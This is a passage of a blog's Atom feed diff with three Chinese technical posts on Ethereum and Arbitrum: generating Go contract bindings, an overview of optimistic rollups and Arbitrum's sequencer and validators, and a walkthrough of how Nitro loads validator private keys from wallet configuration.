+    <updated>2024-09-23T11:34:16.271Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><p>这篇文章深入探讨了以太坊的交互机制，强调通过以太坊支持的工具链实现链上合约与链下应用（如Chainlink和Arbitrum）的有效交互，特别是在合约调用、事件监控及交易构造等方面的具体实现和注意事项。</p></blockquote><h2 id="我们要谈的交互"><a href="#我们要谈的交互" class="headerlink" title="我们要谈的交互"></a>我们要谈的交互</h2><p>首先要明确一点，以太坊是一个去中心化的平台，他不可能为了某个项目而新增交互接口。<br>我这里说的交互是指应用是链上合约的交互，更明确的说，是chainlink,arbitrum,cosmos这些链下应用与链上合约的交互。<br>所以这里我不是想说以下交互方式：</p><ul><li>通过钱包交互：将应用打包成一个网页，连接类似与<code>小狐狸</code> 这样的钱包，与链发生交互。</li><li>手动构造交易：构建交易tx并使用私钥对交易进行签名，然后直接发送到链给定的接口上。</li></ul><p>对于一些简单的调用，通过上面两种方式是可行的，例如我们只是做一些nft的构造，通过钱包是最合适的。但是对于向arbitrum这类<br>链上的应用，如果要做一个交互式单步证明，在这个过程中我需要监控链上合约抛出的event,分析event并构造出相应结果。<br>这个时候钱包就很难插手，而如果主动构造交易并签名，那么过程太繁琐。实际上以太坊上已经提供了相关的工具链。</p><p>我们要谈的交互方式就是，通过以太坊支持的工具链实现与以太坊的交互</p><h3 id="工具链"><a href="#工具链" class="headerlink" title="工具链"></a>工具链</h3><p><img src="https://pic.imgdb.cn/item/66e152a4d9c307b7e9c4c8ac.png" class="lazyload" data-srcset="https://pic.imgdb.cn/item/66e152a4d9c307b7e9c4c8ac.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="工具链"></p><p>简单而言是使用以太坊工具将sol的合约代码转换成go的类文件，并对调用细节进行封装。<br>而在应用层（arbitrum,chainlink这一层）可以直接将对应参数传过去就可以.</p><p><strong>以arbitrum为例:</strong></p><h4 id="生成go代码"><a href="#生成go代码" class="headerlink" title="生成go代码"></a>生成go代码</h4><p>生成工具在： <a href="https://github.com/OffchainLabs/nitro/blob/master/solgen/gen.go">https://github.com/OffchainLabs/nitro/blob/master/solgen/gen.go</a><br>由于arbitrum用到链makefile,所我们没法通过运行这个文件（go run gen.go）的方式,去生成合约文件。<br>不过实际上这是一个路径的问题，在代码的第71行：</p><pre><code class="go">    filePaths, err := filepath.Glob(filepath.Join(parent, &quot;contracts&quot;, &quot;build&quot;, &quot;contracts&quot;, &quot;src&quot;, &quot;*&quot;, &quot;*.sol&quot;, &quot;*.json&quot;))    if err != nil &#123;        log.Fatal(err)    &#125;    filePathsSafeSmartAccount, err := filepath.Glob(filepath.Join(parent, &quot;safe-smart-account&quot;, &quot;build&quot;, &quot;artifacts&quot;, &quot;contracts&quot;, &quot;*&quot;, &quot;*.sol&quot;, &quot;*.json&quot;))    if err != nil &#123;        log.Fatal(err)    &#125;    filePathsSafeSmartAccountOuter, err := filepath.Glob(filepath.Join(parent, &quot;safe-smart-account&quot;, &quot;build&quot;, &quot;artifacts&quot;, &quot;contracts&quot;, &quot;*.sol&quot;, &quot;*.json&quot;))    if err != nil &#123;        log.Fatal(err)    &#125;</code></pre><p>这里实际上就指定了合约代码的路径，当然如果只是初次下载合约文件应该是看不到build目录的，需要在合约所在项目构建一下，才能生成这个build文件</p><p>构造方法：</p><pre><code class="sh">yarn --cwd contracts buildyarn --cwd contracts build:forge:yul# 其实就是hardhat compile的产物</code></pre><p>然后就会在solgen这个目录下生成对应的go文件<br><img src="https://pic.imgdb.cn/item/66e159acd9c307b7e9cfc23f.png" class="lazyload" data-srcset="https://pic.imgdb.cn/item/66e159acd9c307b7e9cfc23f.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="solgen"></p><p>我们具体看一下这个生成的代码怎么用</p><h4 id="使用生成的代码"><a href="#使用生成的代码" class="headerlink" title="使用生成的代码"></a>使用生成的代码</h4><p>首先可以看到在生成的代码中，每一个合约都有一个对应的类<br>eg：</p><pre><code class="go">// ChallengeLibTransactorRaw is an auto generated low-level write-only Go binding around an Ethereum contract.type ChallengeLibTransactorRaw struct &#123;    Contract *ChallengeLibTransactor // Generic write-only contract binding to access the raw methods on&#125;</code></pre><p>合约中的方法则对应到类的方法</p><p>eg:</p><pre><code class="go">// Solidity: function oneStepProveExecution(uint64 challengeIndex, (uint256,uint256,bytes32[],uint256) selection, bytes proof) returns()func (_ChallengeManager *ChallengeManagerTransactor) OneStepProveExecution(opts *bind.TransactOpts, challengeIndex uint64, selection ChallengeLibSegmentSelection, proof []byte) (*types.Transaction, error) &#123;    return _ChallengeManager.contract.Transact(opts, &quot;oneStepProveExecution&quot;, challengeIndex, selection, proof)&#125;</code></pre><p>其中关键在与这里的opts,如果我们继续进到这个Transact方法里面会发现，链上的信息都是由这里的opts获取的，用户签名接口，用户信息等</p><p>那么对于一个合约调用就分为两部分，一是调用参数，也就是这里的opts和合约参数，一是对接一台的的client</p><h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><p>进入到这里的opts,这是以太坊里面的数据结构</p><pre><code class="go">// valid Ethereum transaction.type TransactOpts struct &#123;    From   common.Address // Ethereum account to send the transaction from    Nonce  *big.Int       // Nonce to use for the transaction execution (nil = use pending state)    Signer SignerFn       // Method to use for signing the transaction (mandatory)    Value     *big.Int // Funds to transfer along the transaction (nil = 0 = no funds)    GasPrice  *big.Int // Gas price to use for the transaction execution (nil = gas price oracle)    GasFeeCap *big.Int // Gas fee cap to use for the 1559 transaction execution (nil = gas price oracle)    GasTipCap *big.Int // Gas priority fee cap to use for the 1559 transaction execution (nil = gas price oracle)    GasLimit  uint64   // Gas limit to set for the transaction execution (0 = estimate)    GasMargin uint64   // Arbitrum: adjusts gas estimate by this many basis points (0 = no adjustment)    Context context.Context // Network context to support cancellation and timeouts (nil = no timeout)    NoSend bool // Do all transact steps but do not send the transaction&#125;</code></pre><p>我们可以看到，这里包含用户信息的签名数据</p><p>对于链下的开发者，我们需要构造这个结构，来调用方法</p><h4 id="client"><a href="#client" class="headerlink" title="client"></a>client</h4><p>我们有链合约的调用参数，那么就需要有一个client来为我们发送交易，（虽然构造交易的时候也用到链client,但这都是已经被工具封装好的，开发者没必要细究它是怎么构建的）</p><p>实际上client是在我们构建合约对象时构建的</p><pre><code class="go">// NewChallengeManager creates a new instance of ChallengeManager, bound to a specific deployed contract.func NewChallengeManager(address common.Address, backend bind.ContractBackend) (*ChallengeManager, error) &#123;    contract, err := bindChallengeManager(address, backend, backend, backend)    if err != nil &#123;        return nil, err    &#125;    return &amp;ChallengeManager&#123;ChallengeManagerCaller: ChallengeManagerCaller&#123;contract: contract&#125;, ChallengeManagerTransactor: ChallengeManagerTransactor&#123;contract: contract&#125;, ChallengeManagerFilterer: ChallengeManagerFilterer&#123;contract: contract&#125;&#125;, nil&#125;</code></pre><p>在构建ChallengeManger这个合约对象时，我们需要给他一个backend,这里的backend就是链的client,地址也就是链上的合约地址</p><p>可以看到backend也是bind这个包里面的，实际上它也是以太坊源码里面的包</p><pre><code class="go">type ContractBackend interface &#123;    ContractCaller    ContractTransactor    ContractFilterer&#125;type ContractCaller interface &#123;    // CodeAt returns the code of the given account. This is needed to differentiate    // between contract internal errors and the local chain being out of sync.    CodeAt(ctx context.Context, contract common.Address, blockNumber *big.Int) ([]byte, error)    // CallContract executes an Ethereum contract call with the specified data as the    // input.    CallContract(ctx context.Context, call ethereum.CallMsg, blockNumber *big.Int) ([]byte, error)&#125;type ContractTransactor interface &#123;    ethereum.GasEstimator    ethereum.GasPricer    ethereum.GasPricer1559    ethereum.TransactionSender    // HeaderByNumber returns a block header from the current canonical chain. If    // number is nil, the latest known header is returned.    HeaderByNumber(ctx context.Context, number *big.Int) (*types.Header, error)    // PendingCodeAt returns the code of the given account in the pending state.    PendingCodeAt(ctx context.Context, account common.Address) ([]byte, error)    // PendingNonceAt retrieves the current pending nonce associated with an account.    PendingNonceAt(ctx context.Context, account common.Address) (uint64, error)&#125;type ContractFilterer interface &#123;    ethereum.LogFilterer&#125;</code></pre><p>这个client看起来构造很麻烦，实际上也是有迹可循的，这里面都是以太坊里的数据结构，所以理论上以太坊里面已经有对象实现了这些接口</p><pre><code class="go">type Client struct &#123;    c rpc.ClientInterface&#125;type ClientInterface interface &#123;    CallContext(ctx_in context.Context, result interface&#123;&#125;, method string, args ...interface&#123;&#125;) error    EthSubscribe(ctx context.Context, channel interface&#123;&#125;, args ...interface&#123;&#125;) (*ClientSubscription, error)    BatchCallContext(ctx context.Context, b []BatchElem) error    Close()&#125;// Client represents a connection to an RPC server.type Client struct &#123;    idgen    func() ID // for subscriptions    isHTTP   bool      // connection type: http, ws or ipc    services *serviceRegistry    idCounter atomic.Uint32    // This function, if non-nil, is called when the connection is lost.    reconnectFunc reconnectFunc    // config fields    batchItemLimit       int    batchResponseMaxSize int    // writeConn is used for writing to the connection on the caller&#39;s goroutine. It should    // only be accessed outside of dispatch, with the write lock held. The write lock is    // taken by sending on reqInit and released by sending on reqSent.    writeConn jsonWriter    // for dispatch    close       chan struct&#123;&#125;    closing     chan struct&#123;&#125;    // closed when client is quitting    didClose    chan struct&#123;&#125;    // closed when client quits    reconnected chan ServerCodec // where write/reconnect sends the new connection    readOp      chan readOp      // read messages    readErr     chan error       // errors from read    reqInit     chan *requestOp  // register response IDs, takes write lock    reqSent     chan error       // signals write completion, releases write lock    reqTimeout  chan *requestOp  // removes response IDs when call timeout expires&#125;</code></pre>]]></content>
+    
+    
+    <summary type="html">这篇文章深入探讨了以太坊的交互机制，强调通过以太坊支持的工具链实现链上合约与链下应用（如Chainlink和Arbitrum）的有效交互，特别是在合约调用、事件监控及交易构造等方面的具体实现和注意事项。</summary>
+    
+    
+    
+    <category term="区块链" scheme="https://bighu630.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
+    
+    <category term="以太坊" scheme="https://bighu630.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"/>
+    
+    
+    <category term="以太坊" scheme="https://bighu630.github.io/tags/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"/>
+    
+    <category term="L2" scheme="https://bighu630.github.io/tags/L2/"/>
+    
+    <category term="arbitrum" scheme="https://bighu630.github.io/tags/arbitrum/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>以太坊Rollup方案之 arbitrum（1）</title>
+    <link href="https://bighu630.github.io/2024/09/10/%E4%BB%A5%E5%A4%AA%E5%9D%8ARollup%E6%96%B9%E6%A1%88%E4%B9%8B-arbitrum%EF%BC%881%EF%BC%89/"/>
+    <id>https://bighu630.github.io/2024/09/10/%E4%BB%A5%E5%A4%AA%E5%9D%8ARollup%E6%96%B9%E6%A1%88%E4%B9%8B-arbitrum%EF%BC%881%EF%BC%89/</id>
+    <published>2024-09-10T12:56:05.000Z</published>
+    <updated>2024-09-23T11:34:16.271Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><p>这篇文章深入探讨了Rollup的概念及其在以太坊扩容中的作用，特别是Arbitrum的实现方式。Rollup作为Layer 2扩容解决方案，通过将交易数据汇总到独立的Rollup链中，减轻了以太坊主链的负担。文章对两种主要的Rollup类型进行了对比：Optimistic Rollup（如Arbitrum）和ZK Rollup，分别介绍了它们在交易验证上的不同方法。</p></blockquote><h2 id="什么是Rollup？"><a href="#什么是Rollup？" class="headerlink" title="什么是Rollup？"></a>什么是Rollup？</h2><blockquote><p>以太坊的Rollup扩容是一种Layer 2（第二层）扩容解决方案，旨在提高以太坊区块链的交易吞吐量和性能。它通过将大量的交易数据转移到以太坊区块链之外的第二层网络来实现这一目标。</p></blockquote><blockquote><p>Rollup的核心思想是将交易数据汇总到k个称为Rollup链的智能合约中，然后将这些汇总数据提交到以太坊主链上进行验证。这样做的好处是，Rollup链可以处理大量的交易，并将结果提交到以太坊主链上进行最终的验证和确认，从而减轻了主链的负担。</p></blockquote><p>目前有两种主流的rollup,一种是arbitrum所属的op rollup（乐观rollup，下面简称op），一种是zk rollup（基于零知识证明的rollup,下面简称zk）.<br>这两者的区别主要在于以太坊验证rollup交易的方式不同。</p><p>对于 op rollup,它的原型是 – 我们默认的认为在L2上发生的交易是没问题，在默认情况下，以太坊不验证rollup的交易。当然，这里只是以太坊不验证，op方案存在链下的验证人，所以op 的交易一般都有一个供验证者验证的窗口期。</p><p>而zk rollup则与之相反，zk悲观的认为L2上的每一笔交易都是不可信的，每一笔交易都必须在以太坊原链上验证。而零知识证明在这里的作用就是，减少验证过程中的gas消耗。比如我们在L2上有一个合约执行的交易，如果L1需要验证L2的交易，我们不能把交易再放到L1上执行一次（一方面这会有很多L1,L2上的映射问题，另一方面，如果验证的时候需要再执行一遍，那我为什么不直接在L1上执行）。零知识证明做到的就是，我们在L2上做了一个复杂的操作（例如一个合约执行），我们可以为这个操作生成一个零知识证明（这里给出我的一个猜测，例如L2为一个提现操作生成了一个零知识证明 p,将p发送至L1,L1上的合约存在验证逻辑，他可以验证当且仅当L2上确实发生了对应的销毁操作，这个证明才可能被构造出来），L1上只需要验证这个证明。</p><h4 id="在正式开始之前需要先澄清一点："><a href="#在正式开始之前需要先澄清一点：" class="headerlink" title="在正式开始之前需要先澄清一点："></a>在正式开始之前需要先澄清一点：</h4><p>rollup并不是去执行L1上的交易，你不可能在L2上执行一个L1的合约，L2是独立于L1而存在的（在数据上来看），L2不主动拥有L1上的任何数据，他只是借用L1提供的去信任机制，L2将自己的数据，高度压缩&#x2F;转换为Kz然后保存在L1上，实际上L1完全看不懂L2传过来的数据是什么意思，而他将数据保存在L1上是为了证明，在任何时候，你都可以通过L1上的这些数据还原L2的状态，从而来确保L2上数据的去信任化。</p><h2 id="aribtrum介绍"><a href="#aribtrum介绍" class="headerlink" title="aribtrum介绍"></a>aribtrum介绍</h2><h3 id="aribtrum结构"><a href="#aribtrum结构" class="headerlink" title="aribtrum结构"></a>aribtrum结构</h3><p>那么我们回到arbitrum的 op rollup，我们先看一下arbitrum的整体架构图：</p><p><img src="https://s2.loli.net/2024/09/10/LWJKnI7yUksctbf.png" class="lazyload" data-srcset="https://s2.loli.net/2024/09/10/LWJKnI7yUksctbf.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240503094701315"></p><p>我们将aribtrum分成三个（四个）部分。第一部分是两个红色框里面的 <strong>排序器 sequencer</strong>，第二部分是绿色框中的 <strong>验证者 validator</strong>，第三部分是在L1中的蓝色框里面的<strong>rollup 合约</strong>，以及第四部分没有画框的资产桥（资产桥不影响aribtrum的主要逻辑，可以看作是aribtrum的增值服务，不过对于公链，资产桥是核心业务)</p><p>先来看一下排序器：</p><p>排序器的主要功能是将L2上的大量交易排序并打包，发送至L1里面的 sequencer inbox 合约（airbitum称之为快箱）</p><p><img src="https://s2.loli.net/2024/09/10/2KZImwbEWD4ka3A.png" class="lazyload" data-srcset="https://s2.loli.net/2024/09/10/2KZImwbEWD4ka3A.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240503095628403"></p><p>排序器主要对接用户的请求，接受用户请求，排序，执行，返回结果，排序起中一批交易一般会在0-2s内被执行（aribtrum逻辑与以太坊相似，这里的执行实际上是落快，但是排序器落快不代表最终结果，他只是因为基于以太坊，所以才有落块这个操作，实际上后面会谈到的Rblock更加贴近区块链的概念），并迅速返回结果给用户，响应速度几乎匹及web2平台。</p><p>排序器会周期性的向L2上的其他节点广播区块。另外，排序器通常会每隔几分种将这段时间内收集到的区块进行一个压缩（使用谷歌的一个压缩率还可以的算法做的压缩，这里的压缩的唯一目的是减少L1上的gas消耗）打包成一个batch保存在sequencerInbox合约中。</p><p>从以上流程中我们可以概括：<strong>Layer2 有自己的节点网络，但这些节点数量稀少，且一般没有公链惯用的共识协议，所以安全性是很差的，必须要依附于以太坊来保证，数据发布的可靠性与状态转换的有效性。</strong></p><p>排序器实际上不参与rollup的过程，他是一个快速执行交易，打包的工具，实际上arbitrum可以不依靠排序起执行，用户可以直接把交易发送给rebitrun one 节点。</p><h4 id="Arbitrum-Rollup-协议："><a href="#Arbitrum-Rollup-协议：" class="headerlink" title="Arbitrum Rollup 协议："></a>Arbitrum Rollup 协议：</h4><p>定义 Rollup 链的区块 RBlock 的结构，链的延续方式，RBlock 的发布，以及挑战模式流程等⼀系列的合约。<strong>注意，这里说的 Rollup 链并不是大家理解的 Layer2 账本，而是 Arbitrum One 为了施展欺诈证明机制，而独立设置的一条抽象出来的「链状数据结构」。</strong></p><p>⼀个 RBlock 可以包含多个 L2 区块的结果，⽽且数据也迥异，它的数据实体 RBlock 存储在 RollupCore 的⼀系列合约中。如果⼀个 RBlock 存在问题，Validator 将⾯向该 RBlock 的提交者对其进⾏挑战。</p><h3 id="验证者-validator"><a href="#验证者-validator" class="headerlink" title="验证者 validator"></a>验证者 validator</h3><p>Arbitrum 的验证者节点其实是 Layer2 全节点的特殊子集，目前有白名单准入。</p><p><img src="https://s2.loli.net/2024/09/10/gLut3jUrocJfw9k.png" class="lazyload" data-srcset="https://s2.loli.net/2024/09/10/gLut3jUrocJfw9k.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240503102940274"></p><p>validator是arbitrum中产生rbolck的主体，验证者节点会监听链上的dequencerInbox合约，下载排序器打包的batch来创建Rblock.同时监听以太坊上的rollup合约，验证其他节点提交的rblock,向异常rblock发起挑战。</p><h5 id="挑战："><a href="#挑战：" class="headerlink" title="挑战："></a>挑战：</h5><p>基础步骤可以概括为多轮互动式细分、单步证明。在细分环节，挑战双⽅先对有问题的交易数据进行多轮回合制细分，直至分解出有问题的那⼀步操作码指令，并进行验证。<strong>「多轮细分-单步证明」这种范式，被 Arbitrum 开发者认为是欺诈证明中最节省 gas 的实现方式</strong>。所有环节都在合约控制之下，没有⼀方可以作弊。</p><h5 id="挑战期："><a href="#挑战期：" class="headerlink" title="挑战期："></a>挑战期：</h5><p>由于 OP Rollup 的乐观 optimistic 本质，每个 RBlock 提交上链后，合约并不主动检查，预留给验证者一段时间窗抠期去证伪。<strong>此时间窗口即为挑战期，在 Arbitrum One 主网上为 1 周。挑战期结束后，该 RBlock 才会被最终确认</strong>，块内对应的从 L2 传递到 L1 的消息（比如通过官方桥执行的提款操作）才能被放行。</p><p>挑战的原理等后面讲ArbOs的WAVM时一起讲</p><h4 id="L2交易的生命周期"><a href="#L2交易的生命周期" class="headerlink" title="L2交易的生命周期"></a>L2交易的生命周期</h4><ol><li><p>用户向排序器发送交易指令。</p></li><li><p>排序器先对待处理交易进数字签名等数据的验证，剔除无效交易，并进行排序和运算。</p></li><li><p>排序器将交易回执发送给⽤户（通常都⾮常快），<strong>但这只是排序器在 ETH 链下进行的「预处理」，处于 Soft Finality 的状态，并不可靠</strong>。但对于信任排序器的⽤户（大部分用户），可以乐观的认为交易已经完成，不会被回滚。</p></li><li><p>排序器将预处理后的交易原始数据，⾼度压缩后封装为⼀个 Batch（批次）。</p></li><li><p><strong>每隔⼀段时间（受到数据量、ETH 拥堵程度等因素影响），排序器会向 L1 上的 Sequencer Inbox 合约发布交易 Batch。</strong>此时可认为，交易已拥有最终性 Hard Finality。</p></li></ol><h3 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续"></a>未完待续</h3>]]></content>
+    
+    
+    <summary type="html">这篇文章深入探讨了Rollup的概念及其在以太坊扩容中的作用，特别是Arbitrum的实现方式。Rollup作为Layer 2扩容解决方案，通过将交易数据汇总到独立的Rollup链中，减轻了以太坊主链的负担。文章对两种主要的Rollup类型进行了对比：Optimistic Rollup（如Arbitrum）和ZK Rollup，分别介绍了它们在交易验证上的不同方法。</summary>
+    
+    
+    
+    <category term="区块链" scheme="https://bighu630.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
+    
+    <category term="二层" scheme="https://bighu630.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/%E4%BA%8C%E5%B1%82/"/>
+    
+    
+    <category term="以太坊" scheme="https://bighu630.github.io/tags/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"/>
+    
+    <category term="L2" scheme="https://bighu630.github.io/tags/L2/"/>
+    
+    <category term="arbitrum" scheme="https://bighu630.github.io/tags/arbitrum/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>区块链应用的密钥管理</title>
+    <link href="https://bighu630.github.io/2024/09/09/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%94%E7%94%A8%E7%9A%84%E5%AF%86%E9%92%A5%E7%AE%A1%E7%90%86/"/>
+    <id>https://bighu630.github.io/2024/09/09/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%94%E7%94%A8%E7%9A%84%E5%AF%86%E9%92%A5%E7%AE%A1%E7%90%86/</id>
+    <published>2024-09-09T08:26:54.000Z</published>
+    <updated>2024-09-23T11:34:16.272Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><p>这篇文章探讨了区块链应用中密钥管理的重要性，特别是在持续向区块链发送交易的场景下，如Arbitrum的Sequencer和Chainlink的数据馈送，强调了安全使用和管理私钥的方法，包括通过配置文件和文件密钥，同时分析了密钥的安全等级以及如何在程序中有效保护密钥，最后以Arbitrum的具体实现为例，详细阐述了密钥的生成、使用和存储过程。</p></blockquote><h2 id="管理什么密钥？"><a href="#管理什么密钥？" class="headerlink" title="管理什么密钥？"></a>管理什么密钥？</h2><p>在区块链应用的基础组件中通常有这样一种功能，需要持续不断的向区块链中发送交易，比如arbitrum的<em>Sequencer</em>需要持续不断的发送L2的区块，<em>stark</em> 需要发送单步证明&#x2F;rBlock发布 的交易，chainlink需要定时发送datafeed交易。而这每一笔交易都需要L1上的账户做签名，如何安全的使用和管理这个密钥是值得关心的。</p><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>就我所看到的一般有两种方式：</p><ul><li>通过配置文件配置私钥</li><li>使用filekey的方式：<ul><li>注意file一般需要一个密码，密码是启动后在终端控制台输入</li></ul></li></ul><p>当然，密钥管理不只是简单的将密钥注入到程序里面，而是如何在程序里面安全的使用这些密钥，毕竟如果密钥发在一个可能被外部接口调用的接口中，可能会降低密钥的安全性。</p><p>密钥安全等级（依次递减，只考虑加密算法公开的情况）：</p><ul><li>黑客无法得知任何明文&amp;密文</li><li>黑客可以得到密文</li><li>黑客可以得到密文对应的明文</li><li>黑客可以自行构造明文产生密文</li></ul><p>所以在程序中也需要对密钥进行保护。</p><blockquote><p>以太坊中每次使用完私钥会将私钥的地址还原成0地址，就是为了避免私钥在内存中泄漏。</p><p>私钥泄漏的原理大致是，geth程序在使用完内存后会释放内存，而他释放内存并不会把内存值全部置0,只是告诉操作系统，“这段内存我不用了，你可以分配给别的程序” 。而别的程序申请到这段内存之后，他是可以直接读取这段内存里的值，（经典案例就是 在c语言中如果你初始化一个变量，而不为赋值，那他的值不是0值，而是原先在这个内存里的值）</p></blockquote><h2 id="arbitrum的处理方案"><a href="#arbitrum的处理方案" class="headerlink" title="arbitrum的处理方案"></a>arbitrum的处理方案</h2><p>先从最底层的调用开始看</p><p>在单步证明的调用中可以看到，这笔交易的用户信息是保存在auth字段中的</p><pre><code class="go">func (m *ChallengeManager) IssueOneStepProof(    ctx context.Context,    oldState *ChallengeState,    startSegment int,) (*types.Transaction, error) &#123;    position := oldState.Segments[startSegment].Position    proof, err := m.executionChallengeBackend.GetProofAt(ctx, position)    if err != nil &#123;        return nil, fmt.Errorf(&quot;error getting OSP from challenge %v backend at step %v: %w&quot;, m.challengeIndex, position, err)    &#125;    return m.challengeCore.con.OneStepProveExecution(        m.challengeCore.auth,   // 用户信息保存在这个字段        m.challengeCore.challengeIndex,        challengegen.ChallengeLibSegmentSelection&#123;            OldSegmentsStart:  oldState.Start,            OldSegmentsLength: new(big.Int).Sub(oldState.End, oldState.Start),            OldSegments:       oldState.RawSegments,            ChallengePosition: big.NewInt(int64(startSegment)),        &#125;,        proof,    )&#125;</code></pre><p>具体如何使用可以继续点进去看，最终是auth中包含一个变量（函数类型的变量），由这个变量进行签名，（我们需要找到的这个函数的生命周期，也就是密钥的生命周期）。</p><p>那么继续往上看，看这个challengeManager的构造方法</p><pre><code class="go">func NewChallengeManager(    ctx context.Context,    l1client bind.ContractBackend,    auth *bind.TransactOpts,    fromAddr common.Address,    challengeManagerAddr common.Address,    challengeIndex uint64,    val *StatelessBlockValidator,    startL1Block uint64,    confirmationBlocks int64,) (*ChallengeManager, error) &#123;    ...    return &amp;ChallengeManager&#123;        challengeCore: &amp;challengeCore&#123;            con:                  con,            challengeManagerAddr: challengeManagerAddr,            challengeIndex:       challengeIndex,            client:               l1client,            auth:                 auth,   // 也就是上面的auth            actingAs:             fromAddr,            startL1Block:         new(big.Int).SetUint64(startL1Block),            confirmationBlocks:   confirmationBlocks,        &#125;,        blockChallengeBackend: backend,        validator:             val,        wasmModuleRoot:        challengeInfo.WasmModuleRoot,        maxBatchesRead:        challengeInfo.MaxInboxMessages,    &#125;, nil&#125;</code></pre><p>可以看到auth是上面传递过来的bind.ContractOpts</p><p>继续往上面看,auth来自与Builder这个结构，好在这个结构的构造函数只被调用过一次（我们及假设唯一的构造得到的auth就是我们要找的auth，中间没有发生更改）</p><pre><code class="go">func NewBuilder(wallet ValidatorWalletInterface) (*Builder, error) &#123;    randKey, err := crypto.GenerateKey()    if err != nil &#123;        return nil, err    &#125;    builderAuth := wallet.AuthIfEoa()    var isAuthFake bool    if builderAuth == nil &#123;        // Make a fake auth so we have txs to give to the smart contract wallet        builderAuth, err = bind.NewKeyedTransactorWithChainID(randKey, big.NewInt(9999999))        if err != nil &#123;            return nil, err        &#125;        isAuthFake = true    &#125;    return &amp;Builder&#123;        builderAuth: builderAuth,        wallet:      wallet,        L1Interface: wallet.L1Client(),        isAuthFake:  isAuthFake,    &#125;, nil&#125;</code></pre><p>builder的auth有两种途径，一种是 AuthIfEoa 也就是从eoa中解析私钥，一种是自己生成私钥</p><p>那么关键在与这里的wallet是什么（也就是现在从跟踪auth转移到跟踪wallet）</p><p>最终发现wallet在creatNoteImpl方法里面构造的</p><pre><code class="go">var wallet staker.ValidatorWalletInterface = validatorwallet.NewNoOp(l1client, deployInfo.Rollup)if !strings.EqualFold(config.Staker.Strategy, &quot;watchtower&quot;) &#123;    if config.Staker.UseSmartContractWallet || (txOptsValidator == nil &amp;&amp; config.Staker.DataPoster.ExternalSigner.URL == &quot;&quot;) &#123;// 合约账户        var existingWalletAddress *common.Address        if len(config.Staker.ContractWalletAddress) &gt; 0 &#123;            if !common.IsHexAddress(config.Staker.ContractWalletAddress) &#123;                log.Error(&quot;invalid validator smart contract wallet&quot;, &quot;addr&quot;, config.Staker.ContractWalletAddress)                return nil, errors.New(&quot;invalid validator smart contract wallet address&quot;)            &#125;            tmpAddress := common.HexToAddress(config.Staker.ContractWalletAddress)            existingWalletAddress = &amp;tmpAddress        &#125;        wallet, err = validatorwallet.NewContract(dp, existingWalletAddress, deployInfo.ValidatorWalletCreator, deployInfo.Rollup, l1Reader, txOptsValidator, int64(deployInfo.DeployedAt), func(common.Address) &#123;&#125;, getExtraGas)        if err != nil &#123;            return nil, err        &#125;    &#125; else &#123;        if len(config.Staker.ContractWalletAddress) &gt; 0 &#123;            return nil, errors.New(&quot;validator contract wallet specified but flag to use a smart contract wallet was not specified&quot;)        &#125;        wallet, err = validatorwallet.NewEOA(dp, deployInfo.Rollup, l1client, getExtraGas)        if err != nil &#123;            return nil, err        &#125;    &#125;&#125;</code></pre><p>继续跟踪我们得到wellet中的验证方法是由txOptsValidator提供的</p><p>向上继续找txOptsValidator</p><p>最重找到mainImpl</p><pre><code class="go">    if sequencerNeedsKey || nodeConfig.Node.BatchPoster.ParentChainWallet.OnlyCreateKey &#123;        l1TransactionOptsBatchPoster, dataSigner, err = util.OpenWallet(&quot;l1-batch-poster&quot;, &amp;nodeConfig.Node.BatchPoster.ParentChainWallet, new(big.Int).SetUint64(nodeConfig.ParentChain.ID))        if err != nil &#123;            flag.Usage()            log.Crit(&quot;error opening Batch poster parent chain wallet&quot;, &quot;path&quot;, nodeConfig.Node.BatchPoster.ParentChainWallet.Pathname, &quot;account&quot;, nodeConfig.Node.BatchPoster.ParentChainWallet.Account, &quot;err&quot;, err)        &#125;        if nodeConfig.Node.BatchPoster.ParentChainWallet.OnlyCreateKey &#123;            return 0        &#125;    &#125;    if validatorNeedsKey || nodeConfig.Node.Staker.ParentChainWallet.OnlyCreateKey &#123;        l1TransactionOptsValidator, _, err = util.OpenWallet(&quot;l1-validator&quot;, &amp;nodeConfig.Node.Staker.ParentChainWallet, new(big.Int).SetUint64(nodeConfig.ParentChain.ID))        if err != nil &#123;            flag.Usage()            log.Crit(&quot;error opening Validator parent chain wallet&quot;, &quot;path&quot;, nodeConfig.Node.Staker.ParentChainWallet.Pathname, &quot;account&quot;, nodeConfig.Node.Staker.ParentChainWallet.Account, &quot;err&quot;, err)        &#125;        if nodeConfig.Node.Staker.ParentChainWallet.OnlyCreateKey &#123;            return 0        &#125;    &#125;</code></pre><p>我们得到l1TransactionOptsValidator是使用<code>nodeConfig.Node.Staker.ParentChainWallet</code> 这个配置项得到的.</p><p>最终的数据结构张这个样子</p><pre><code class="go">type WalletConfig struct &#123;    Pathname      string `koanf:&quot;pathname&quot;`    Password      string `koanf:&quot;password&quot;`    PrivateKey    string `koanf:&quot;private-key&quot;`    Account       string `koanf:&quot;account&quot;`    OnlyCreateKey bool   